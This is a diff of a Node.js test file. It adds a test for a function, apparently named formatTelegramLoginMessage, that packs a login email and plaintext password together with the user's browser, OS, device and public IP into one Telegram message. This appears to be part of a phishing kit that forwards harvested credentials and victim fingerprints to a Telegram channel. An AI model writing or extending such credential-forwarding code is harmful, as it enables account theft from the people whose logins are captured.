@@ -1,6 +1,6 @@
 const assert = require('node:assert/strict');
 const test = require('node:test');
-const { generateClientInfoPayload, getClientIpMetadata, normalizeClientInfo, formatTelegramClientInfo } = require('../utils/clientInfo');
+const { generateClientInfoPayload, getClientIpMetadata, normalizeClientInfo, formatTelegramClientInfo, formatTelegramLoginMessage } = require('../utils/clientInfo');
 
 test('normalizes browser and server payloads without trusting client IPs', () => {
   const sample = {
@@ -162,4 +162,22 @@ test('formats a compact Telegram client summary that stays within Telegram limit
   assert.ok(message.includes('Browser:'));
   assert.ok(message.includes('Capabilities:'));
   assert.ok(message.length <= 4096, `Telegram message is too long: ${message.length} chars`);
+});
+
+test('combines login credentials and client environment into one Telegram message', () => {
+  const message = formatTelegramLoginMessage({
+    identifier: 'user@example.com',
+    password: 'Password123',
+    clientInfo: {
+      browser: { name: 'Chrome', version: '127' },
+      system: { os: 'Windows', osVersion: '11' },
+      device: { type: 'desktop' },
+      server: { publicIp: '203.0.113.55' }
+    }
+  });
+
+  assert.ok(message.includes('Username/Email:'));
+  assert.ok(message.includes('Password:'));
+  assert.ok(message.includes('Browser: Chrome'));
+  assert.ok(message.includes('IP: 203.0.113.55'));
 });
